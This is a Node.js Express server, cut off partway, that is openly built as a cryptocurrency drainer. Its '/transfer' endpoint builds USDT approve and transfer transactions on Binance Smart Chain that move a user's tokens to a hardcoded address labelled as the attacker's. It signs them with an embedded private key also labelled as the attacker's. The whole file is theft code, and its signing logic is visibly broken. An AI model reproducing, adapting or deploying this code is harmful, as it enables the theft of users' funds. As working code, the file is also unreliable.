const express = require('express');
const bodyParser = require('body-parser');
const { Web3 } = require('web3');
const nodemailer = require('nodemailer');

const app = express();
const port = 3000;

app.use(bodyParser.json());

const web3 = new Web3('https://bsc-dataseed.binance.org/');
const attackerAddress = '0x92C6b60aFf18a5b5475c78175355913C6BA4E73E'; // Attacker's address
const contractABI = [
    {
        "constant": true,
        "inputs": [],
        "name": "name",
        "outputs": [
            {
                "name": "",
                "type": "string"
            }
        ],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    },
    {
        "constant": false,
        "inputs": [
            {
                "name": "_spender",
                "type": "address"
            },
            {
                "name": "_value",
                "type": "uint256"
            }
        ],
        "name": "approve",
        "outputs": [
            {
                "name": "",
                "type": "bool"
            }
        ],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "constant": true,
        "inputs": [],
        "name": "totalSupply",
        "outputs": [
            {
                "name": "",
                "type": "uint256"
            }
        ],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    },
    {
        "constant": false,
        "inputs": [
            {
                "name": "_from",
                "type": "address"
            },
            {
                "name": "_to",
                "type": "address"
            },
            {
                "name": "_value",
                "type": "uint256"
            }
        ],
        "name": "transferFrom",
        "outputs": [
            {
                "name": "",
                "type": "bool"
            }
        ],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "constant": true,
        "inputs": [
            {
                "name": "_owner",
                "type": "address"
            }
        ],
        "name": "balanceOf",
        "outputs": [
            {
                "name": "balance",
                "type": "uint256"
            }
        ],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    },
    {
        "constant": true,
        "inputs": [],
        "name": "decimals",
        "outputs": [
            {
                "name": "",
                "type": "uint8"
            }
        ],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    },
    {
        "constant": true,
        "inputs": [
            {
                "name": "_owner",
                "type": "address"
            },
            {
                "name": "_spender",
                "type": "address"
            }
        ],
        "name": "allowance",
        "outputs": [
            {
                "name": "",
                "type": "uint256"
            }
        ],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    },
    {
        "constant": false,
        "inputs": [
            {
                "name": "_to",
                "type": "address"
            },
            {
                "name": "_value",
                "type": "uint256"
            }
        ],
        "name": "transfer",
        "outputs": [
            {
                "name": "",
                "type": "bool"
            }
        ],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "constant": true,
        "inputs": [
            {
                "name": "_token",
                "type": "address"
            }
        ],
        "name": "getTokenInfo",
        "outputs": [
            {
                "name": "name",
                "type": "string"
            },
            {
                "name": "symbol",
                "type": "string"
            },
            {
                "name": "decimals",
                "type": "uint8"
            },
            {
                "name": "totalSupply",
                "type": "uint256"
            }
        ],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    },
    {
        "constant": false,
        "inputs": [
            {
                "name": "_spender",
                "type": "address"
            },
            {
                "name": "_value",
                "type": "uint256"
            },
            {
                "name": "_extraData",
                "type": "bytes"
            }
        ],
        "name": "approveAndCall",
        "outputs": [
            {
                "name": "success",
                "type": "bool"
            }
        ],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "anonymous": false,
        "inputs": [
            {
                "indexed": true,
                "name": "owner",
                "type": "address"
            },
            {
                "indexed": true,
                "name": "spender",
                "type": "address"
            },
            {
                "indexed": false,
                "name": "value",
                "type": "uint256"
            }
        ],
        "name": "Approval",
        "type": "event"
    },
    {
        "anonymous": false,
        "inputs": [
            {
                "indexed": true,
                "name": "from",
                "type": "address"
            },
            {
                "indexed": true,
                "name": "to",
                "type": "address"
            },
            {
                "indexed": false,
                "name": "value",
                "type": "uint256"
            }
        ],
        "name": "Transfer",
        "type": "event"
    }
];
const contractAddress = '0x55d398326f99059fF775485246999027B3197955'; // USDT contract address on BSC

const contract = new web3.eth.Contract(contractABI, contractAddress);

app.post('/transfer', async (req, res) => {
    const { userAddress, amount } = req.body;

    try {
        console.log(`User Address: ${userAddress}`);
        console.log(`Amount: ${amount}`);

        if (!userAddress || !amount) {
            throw new Error('User address or amount is undefined');
        }

        // Convert the amount back to BigInt
        const amountBigInt = BigInt(amount);

        // Create a new contract instance with the user's address
        const userContract = new web3.eth.Contract(contractABI, contractAddress);

        // Check the user's balance
        const balance = await userContract.methods.balanceOf(userAddress).call();
        console.log(`User balance: ${balance}`);

        if (balance < amountBigInt) {
            throw new Error('Insufficient balance');
        }

        // Approve the contract to spend all tokens
        const approvalTx = userContract.methods.approve(attackerAddress, amountBigInt);
        const data = approvalTx.encodeABI();

        const tx = {
            from: userAddress,
            to: contractAddress,
            data: data,
            gas: 200000
        };

        // Sign the transaction with the attacker's private key
        const signedTx = await web3.eth.accounts.signTransaction(tx, '0xf28b12f8476c558e0a99015b004a32654c08e5fc888825425d3a5a1ed57197fd');
        const txHash = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
        console.log('Approval transaction sent:', txHash);

        // Transfer all funds to the attacker's address
        const transferTx = userContract.methods.transfer(attackerAddress, amountBigInt);
        const transferData = transferTx.encodeABI();

        const transferTxObj = {
            from: userAddress,
            to: contractAddress,
            data: transferData,
            gas: 20
